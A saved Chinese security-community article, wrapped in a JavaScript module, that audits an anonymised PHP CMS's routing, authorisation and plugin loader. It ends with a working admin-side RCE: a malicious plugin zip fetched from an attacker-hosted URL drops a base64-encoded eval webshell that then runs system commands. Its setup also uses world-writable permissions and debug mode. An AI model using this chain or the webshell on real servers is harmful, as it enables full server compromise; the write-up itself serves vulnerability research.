const n=`# \u6587\u7AE0 - \u67D0PHPCMS\u4EE3\u7801\u5BA1\u8BA1  - \u5148\u77E5\u793E\u533A

Created: March 26, 2025 1:19 PM
URL: https://xz.aliyun.com/news/15482
\u6587\u7AE0\u4E8C\u7EA7\u7C7B\u522B: 0Day\u6316\u6398-\u6CE8\u610F\u56FE\u7247\u624B\u52A8\u62D6\u8FDB\u6765
\u6587\u7AE0\u7C7B\u522B(\u6839\u636EWebStorm\u7684\u76EE\u5F55\u6765): \u4EE3\u7801\u5BA1\u8BA1

## \u9879\u76EE\u4ECB\u7ECD

\u8BE5CMS\u517C\u5BB9PHP5.6-PHP7\uFF0C\u53EF\u4F7F\u7528 MySQL \u6216 PostgreSQL \uFF0C\u4F7F\u7528\u4E86Pimple\u4F9D\u8D56\u6CE8\u5165\u5BB9\u5668\u53BB\u5B9E\u73B0\u5B58\u50A8\u5404\u79CD\u670D\u52A1\u548C\u5BF9\u8C61\u7684\u5B9E\u4F8B\uFF0C\u4F8B\u5982\u63A7\u5236\u5668\u7684\u6CE8\u518C\u548C\u7BA1\u7406\uFF0C\u4E2D\u95F4\u4EF6\u7684\u6CE8\u518C\u3002

\u529F\u80FD\u7279\u6027\uFF1A

- \u7B80\u6D01\u3001\u7F8E\u89C2\u7684\u754C\u9762
- \u652F\u6301\u591A\u4E3B\u9898
- \u53EF\u89C6\u5316\u7684\u4EFB\u52A1\u7BA1\u7406
- \u652F\u6301\u5217\u8868\u3001\u770B\u677F\u548C\u7518\u7279\u56FE\u7B49\u4EFB\u52A1\u89C6\u56FE
- \u53EF\u62D6\u62FD\u5F0F\u7684\u4EFB\u52A1\u64CD\u4F5C
- \u652F\u6301\u591A\u8BED\u8A00\uFF0C\u5185\u7F6E\u82F1\u6587\u548C\u7B80\u4F53\u4E2D\u6587\u8BED\u8A00\u5305
- \u8FC7\u6EE4\u641C\u7D22
- \u53EF\u521B\u5EFA\u56E2\u961F\u9879\u76EE\u548C\u4E2A\u4EBA\u9879\u76EE
- \u652F\u6301\u4EFB\u52A1\u3001\u5B50\u4EFB\u52A1\u3001\u9644\u4EF6\u548C\u8BC4\u8BBA
- \u52A8\u4F5C\u81EA\u52A8\u89E6\u53D1
- \u53EF\u89C6\u5316\u7684\u7EDF\u8BA1
- \u7B2C\u4E09\u65B9\u96C6\u6210
- \u652F\u6301\u63D2\u4EF6

## \u90E8\u7F72

\u4E00. \u8BBE\u7F6E\u914D\u7F6E\u6587\u4EF6

\`\`\`
cp .env.example .env

APP_ENV=production
APP_DEBUG=true
APP_KEY=SomeRandomString
APP_TIMEZONE=Asia/Shanghai
APP_LOCALE=zh-CN
APP_THEME=black
APP_LOG=daily
APP_LOG_LEVEL=error
APP_URL=http://localhost
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=xxx
DB_USERNAME=root
DB_PASSWORD=123456
\`\`\`

\u4E09. \u5B89\u88C5\u4F9D\u8D56\u5305

\u5148\u628Acomposer.json\u768449\u884C\u5F00\u59CB\u7684\u6539\u6210\u8FD9\u6837

\`\`\`
"autoload" : {
        "classmap" : ["app/"],
        "psr-4" : {
            "cmsname\\\\" : "app/",
             "PicoDb\\\\": "vendor/cmsname/picodb/src/",
             "SimpleLogger\\\\":"vendor/cmsname/simple-logger/src",
             "JsonRPC\\\\":"vendor/cmsname/json-rpc/src",
             "SimpleValidator\\\\":"vendor/cmsname/simple-validator/src"
        },
        "files" : [
            "app/helpers.php"
        ]
    },
\`\`\`

\u4E0D\u7136\u540E\u9762\u5C31\u4F1A\u52A0\u8F7D\u4E0D\u51FAUrlParser\u7C7B\uFF0C\u4E0Anginx\u7684\u65F6\u5019\u4F1A\u627E\u4E0D\u5230SimpleLogger\u548CJsonRPC\u8FD8\u6709Validator

\u51FA\u73B0\u5982\u4E0B\u627E\u4E0D\u5230\u5BF9\u5E94\u7C7B\u7684\u62A5\u9519

\`\`\`
Phinx by Rob Morgan - https://phinx.org. 0.6.6
using config file ./phinx.php
PHP Fatal error:  Uncaught Error: Class 'PicoDb\\UrlParser' not found in /var/www/cmsname/bootstrap/autoload.php:17
Stack trace:
#0 /var/www/cmsname/phinx.php(18): require()
#1 /var/www/cmsname/vendor/robmorgan/phinx/src/Phinx/Config/Config.php(111): include('/var/www/jitami...')
#2 /var/www/cmsname/vendor/robmorgan/phinx/src/Phinx/Console/Command/AbstractCommand.php(248): Phinx\\Config\\Config::fromPhp('/var/www/jitami...')
#3 /var/www/cmsname/vendor/robmorgan/phinx/src/Phinx/Console/Command/AbstractCommand.php(92): Phinx\\Console\\Command\\AbstractCommand->loadConfig(Object(Symfony\\Component\\Console\\Input\\ArgvInput), Object(Symfony\\Component\\Console\\Output\\ConsoleOutput))
#4 /var/www/cmsname/vendor/robmorgan/phinx/src/Phinx/Console/Command/Migrate.php(72): Phinx\\Console\\Command\\AbstractCommand->bootstrap(Object(Symfony\\Component\\Console\\Input\\ArgvInput), Object(Symfony\\Component\\Console\\Output\\ConsoleOutput))
#5 /var/www/cmsname/vendor/symfony/console/Command/Command.php(251): Phinx\\Console\\Command\\Migrate->execute(Object(Symfony\\ in /var/www/cmsname/bootstrap/autoload.php on line 17
\`\`\`

\u4E4B\u540E composer install

\u8FD9\u91CC\u5728win\u53EF\u80FD\u4F1A\u51FA\u73B0\u9519\u8BEF\uFF0C\u53EF\u9009\u62E9\u5728linux\u73AF\u5883\u4E0B\u8F7D\u4F9D\u8D56\uFF0C\u518D\u628A/vendor\u590D\u5236\u8FC7\u6765

\u56DB. \u5B89\u88C5\u6570\u636E\u5E93\u8FC1\u79FB\u548C\u521D\u59CB\u6570\u636E

- \u521B\u5EFA\u6570\u636E\u8868
    
    vendor/bin/phinx migrate
    
- \u5B89\u88C5\u521D\u59CB\u6570\u636E
    
    vendor/bin/phinx seed:run
    

\u4E94. \u786E\u4FDDbootstrap/cache\u548Cstorage\u76EE\u5F55\u53EF\u5199\u3002

\`\`\`
$ chmod -R 0777 bootstrap/cache
$ chmod -R 0777 storage
\`\`\`

\u516D. \u914D\u7F6EWeb\u670D\u52A1\u5668

\u5C06Web\u670D\u52A1\u5668\u7684\u6839\u76EE\u5F55\u6307\u5411 \`public/\`

## \u8DEF\u7531\u8F6C\u53D1

- \u542F\u52A8\u65F6bootstrap/app.php\u91CC\u9762\u8C03\u7528Container.php\u7684\`register(ServiceProviderInterface $provider, array $values = array())\`\u53BB\u52A0\u8F7D\u5404\u79CD\u670D\u52A1

![](https://xzfile.aliyuncs.com/media/upload/picture/20241030000438-7fee3f70-960f-1.png)

- \`ServiceProviderInterface\`\u63A5\u53E3\u7684\u8DEF\u7531\u90E8\u5206\u88AB\`RouteServiceProvider\`\u5B9E\u73B0\uFF0C\u6211\u4EEC\u4E3B\u8981\u5173\u6CE8\u8FD9\u4E2A\u8DEF\u7531\u7684ServiceProvider
- \`RouteServiceProvider\`\u7C7B\u5B9E\u73B0\u4E86 \`ServiceProviderInterface\` \u63A5\u53E3\uFF0C\u8D1F\u8D23\u5C06\u8DEF\u7531\u76F8\u5173\u7684\u670D\u52A1\u6CE8\u518C\u5230\u5BB9\u5668\u4E2D\u3002
- \u901A\u8FC7\`register()\`\u65B9\u6CD5\uFF0C\u5C06 \`Route\` \u548C \`Router\` \u6CE8\u518C\u5230 \`Pimple\` \u5BB9\u5668\u4E2D\uFF0C\u904D\u5386\u52A0\u8F7D\`routes\`\u76EE\u5F55\u4E0B\u9762\u7684\u8DEF\u7531\u8868\u3002

![](https://xzfile.aliyuncs.com/media/upload/picture/20241030000716-dde53494-960f-1.png)

- \u8FDB\u5230index.php\u7684\`excute()\`\uFF0C\u5728\`Application.php\`\u7C7B\u91CC\u9762\u8DDF\u8FDB\u5230\uFF0C\u6709\u4E2A\`$this->container['router']->dispatch();\`

![](https://xzfile.aliyuncs.com/media/upload/picture/20241030102244-d8acdb66-9665-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20241030102303-e3f0b2a4-9665-1.png)

4.\u56E0\u4E3A\`$controller === ''\`\uFF0C\u8FDB\u5230\`findRoute()\`\uFF0C\u4E5F\u5C31\u662F\u4E4B\u524D\u88AB\u6CE8\u518C\u7684Route\u7C7B\u91CC\u9762\uFF0C\u7136\u540E\u53BB\u89E3\u6790\u51FA\u6765controller,action,plugin\u3002

![](https://xzfile.aliyuncs.com/media/upload/picture/20241030102330-f45ec8c4-9665-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20241030102351-00db0108-9666-1.png)

5.\u56DE\u5230\`Application.php\`,\u6267\u884C\`executeMiddleware()\`\u52A0\u8F7D\u4E2D\u95F4\u4EF6\uFF0C\u6267\u884C\`executeController()\`\u52A0\u8F7D\u63A7\u5236\u5668\uFF0C

![](https://xzfile.aliyuncs.com/media/upload/picture/20241030102406-097aaf34-9666-1.png)

\u8C03\u7528 \`$controllerObject->{$this->router->getAction()}();\` \uFF08\u8C03\u4E86\u5728Router.php\u91CC\u9762\u7684\u65B9\u6CD5\uFF09\u6267\u884C\u5177\u4F53\u7684\u63A7\u5236\u5668\u52A8\u4F5C\u3002

![](https://xzfile.aliyuncs.com/media/upload/picture/20241030102458-28876fac-9666-1.png)

\u5176\u5B9E\u5C31\u662FexecuteMiddleware\u4E00\u4E2A\u53CD\u5C04\uFF0C\u5148$controllerObject = new controller()\uFF0C\u518D$controllerObject->{$this->router->getAction()}()

## \u9274\u6743\u5206\u6790

Foundation/Security/Role.php\u91CC\u9762\u5212\u5206\u4E86\u6743\u9650\u7B49\u7EA7

class Role
{
const APP_ADMIN = 'app-admin';
const APP_MANAGER = 'app-manager';
const APP_USER = 'app-user';
const APP_PUBLIC = 'app-public';
const PROJECT_MANAGER = 'project-manager';
const PROJECT_MEMBER = 'project-member';
const PROJECT_VIEWER = 'project-viewer';
/**
* Get application roles.
*
* @return array
*/
public function getApplicationRoles()
{
return [
self::APP_ADMIN   => t('Administrator'),
self::APP_MANAGER => t('Manager'),
self::APP_USER    => t('User'),
];
}
/**
* Get project roles.
*
* @return array
*/
public function getProjectRoles()
{
return [
self::PROJECT_MANAGER => t('Project Manager'),
self::PROJECT_MEMBER  => t('Project Member'),
self::PROJECT_VIEWER  => t('Project Viewer'),
];
}
}

\u9274\u6743\u7684\u670D\u52A1\u4E5F\u662F\u50CF\u4E0A\u9762\u5173\u4E8E\u8DEF\u7531\u8F6C\u53D1\u7684\u6D41\u7A0B\u4E00\u6837\uFF0C\u5F80\u5BB9\u5668\u91CC\u9762\u6CE8\u518C\u4E00\u4E2AAuthServiceProvider\uFF08\u9274\u6743\u90E8\u5206\u5148\u6CE8\u518C\uFF09

![](https://xzfile.aliyuncs.com/media/upload/picture/20241030102532-3cd95858-9666-1.png)

\u7136\u540E\u5728\`getProjectAccessMap()\`\u91CC\u4F9D\u636E\u4E0A\u9762\u5212\u5206\u7684\u6743\u9650\uFF0C\u5206\u914D\u4E86\u5404\u4E2AController\u7684\u6743\u9650

![](https://xzfile.aliyuncs.com/media/upload/picture/20241030102542-4329498e-9666-1.png)

\u5728\u8BBF\u95EElogin\u8DEF\u7531\u65F6\uFF0C\u7531app/Http/Controllers/Auth/AuthController.php\u5B9E\u73B0\u9274\u6743\uFF0C\u4F1A\u8FDB\u5230login\u65B9\u6CD5

![](https://xzfile.aliyuncs.com/media/upload/picture/20241030102558-4c92efe8-9666-1.png)

\u767B\u9646\u65F6\u4F1A\u8FDB\u5230login\u4E0B\u9762\u7684check\u65B9\u6CD5

cookie\u7684\u90E8\u5206\u662Fapp/Foundation/Session/SessionManager.php\uFF0C\u751F\u6210JM_SID\uFF0Capp/Foundation/Http/RememberMeCookie.php\uFF0C\u751F\u6210JM_RM

![](https://xzfile.aliyuncs.com/media/upload/picture/20241030102615-56544b6c-9666-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20241030102634-6219f618-9666-1.png)

## \u6F0F\u6D1E\u6316\u6398

### \u540E\u53F0\u6F0F\u6D1E-\u63D2\u4EF6RCE

\u8BBF\u95EE\u8DEF\u7531\u65F6\uFF0Cindex.php\u4F1Arequire bootstrap/app.php\uFF0C\u7C7B\u4F3Cjava\u7684SPI\u4F1A\u8C03\u7528\u5404\u4E2AProvider\u7684register\u3002

![](https://xzfile.aliyuncs.com/media/upload/picture/20241030102710-7776adc6-9666-1.png)

PluginServiceProvider\u4F1A\u626B\u63CF\u63D2\u4EF6

![](https://xzfile.aliyuncs.com/media/upload/picture/20241030102722-7e67168e-9666-1.png)

\`scan()\`\u65B9\u6CD5\u626B\u63CFplugins\u76EE\u5F55\u4E0B\u6709\u65E0\u76EE\u5F55\uFF0C\u6709\u7684\u8BDD\u5148\u6267\u884CloadSchema\u3002

![](https://xzfile.aliyuncs.com/media/upload/picture/20241030102738-87d3a2c8-9666-1.png)

\`hasSchema()\`->\`getSchemaFilename()\`\u53BB\u627E/pluginName/Schema/mysql.php\uFF0C\u53D6\u51B3\u4E8E\u4F7F\u7528\u54EA\u79CD\u6570\u636E\u5E93

public function loadSchema($pluginName)
{
if (SchemaHandler::hasSchema($pluginName)) {
$schemaHandler = new SchemaHandler($this->container);
$schemaHandler->loadSchema($pluginName);
}
}
public static function hasSchema($pluginName)
{
return file_exists(self::getSchemaFilename($pluginName));
}
public static function getSchemaFilename($pluginName)
{
return PLUGINS_DIR.'/'.$pluginName.'/Schema/'.ucfirst(DB_DRIVER).'.php';
}

\u5982\u679C\u627E\u5230\u7684\u8BDD\u5C31\`loadSchema()\`\u53BBrequire

public function loadSchema($pluginName)
{
require_once self::getSchemaFilename($pluginName);
$this->migrateSchema($pluginName);
}

\u6839\u636E\u4E0A\u8FF0\u6D41\u7A0B\u505A\u4E00\u4E2A\u538B\u7F29\u5305test.zip\uFF0C\u7ED3\u6784\u4E3Atest/Schema/mysql.php

![](https://xzfile.aliyuncs.com/media/upload/picture/20241030102813-9ccc6426-9666-1.png)

mysql.php

file_put_contents("webshell.php",base64_decode("PD9waHAgQGV2YWwoJF9HRVRbMV0pOw=="));
if(file_exists("../plugins/ABC")){
deldir("../plugins/ABC");
}
function deldir($dir) {
//\u5148\u5220\u9664\u76EE\u5F55\u4E0B\u7684\u6587\u4EF6\uFF1A
$dh=opendir($dir);
while ($file=readdir($dh)) {
if($file!="." && $file!="..") {
$fullpath=$dir."/".$file;
if(!is_dir($fullpath)) {
unlink($fullpath);
} else {
deldir($fullpath);
}
}
}
closedir($dh);
//\u5220\u9664\u5F53\u524D\u6587\u4EF6\u5939\uFF1A
if(rmdir($dir)) {
return true;
} else {
return false;
}
}

\u5728app/Http/Controllers/Admin/PluginController.php\u91CC\u9762\uFF0Carchive_url\u53EF\u63A7\uFF0C\u6309\u7167\u4E4B\u524D\u5BF9\u4E8E\u8DEF\u7531\u7684\u5206\u6790\uFF0Caction=install\u5373\u53EF\u89E6\u53D1\uFF0C\u8DEF\u7531\u4E3AAdmin/PluginController

public function install()
{
$pluginArchiveUrl = urldecode($this->request->getStringParam('archive_url'));
try {
$installer = new Installer($this->container);
$installer->install($pluginArchiveUrl);
$this->flash->success(t('Plugin installed successfully.'));
} catch (PluginInstallerException $e) {
$this->flash->failure($e->getMessage());
}
$this->response->redirect($this->helper->url->to('Admin/PluginController', 'show'));
}

\u628A\u538B\u7F29\u5305\u6302\u5728\u81EA\u5DF1vps\u4E0A\uFF0Cadmin\u767B\u9646\u540E\u8BBF\u95EE[http://127.0.0.1/?controller=Admin/PluginController&action=install&archive_url=http://yourIP:port/test.zip](http://127.0.0.1/?controller=Admin/PluginController&action=install&archive_url=http://yourIP:port/test.zip)
\u53BB\u89E6\u53D1\u4E0B\u8F7D\u63D2\u4EF6

\u5B8C\u6210RCE
[http://127.0.0.1/webshell.php?1=system(%22whoami%22](http://127.0.0.1/webshell.php?1=system(%22whoami%22));

![](https://xzfile.aliyuncs.com/media/upload/picture/20241030102839-ac3ea022-9666-1.png)

### \u6F5C\u5728\u5371\u5BB3

\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6 filename\u90E8\u5206\u53EF\u63A7\u3002\u524D\u7F00\u4E0D\u53EF\u63A7\u3002
[http://127.0.0.1/?controller=Profile/AvatarController&action=image&user_id=1&size=123](http://127.0.0.1/?controller=Profile/AvatarController&action=image&user_id=1&size=123)

\u8FD9\u4E2A\u53EA\u80FD\u5B9E\u73B0\u8BFB\u53D6admin\u5934\u50CF

$filename = $this->path.DIRECTORY_SEPARATOR.$key;
if (!file_exists($filename)) {
throw new ObjectStorageException('File not found: '.$filename);
}
return file_get_contents($filename);

filename\u4ECE\u6570\u636E\u5E93\u91CC\u53D6\uFF0C\u4E0A\u4F20\u5934\u50CF\u90A3\u91CC\u8DEF\u5F84\u5B8C\u5168\u4E0D\u53EF\u63A7\uFF0Cavator\u96BE\u4EE5\u5229\u7528\u3002\u5982\u679C\u627E\u5230\u4E00\u4E2Asql\u6CE8\u5165\uFF0C\u4FEE\u6539user\u91CC\u7684avator\u5730\u5740\u90A3\u4E48\u5C31\u53EF\u4EE5\u5B9E\u73B0\u8BFB\u53D6\u4EFB\u610F\u6587\u4EF6\u3002`;export{n as _};
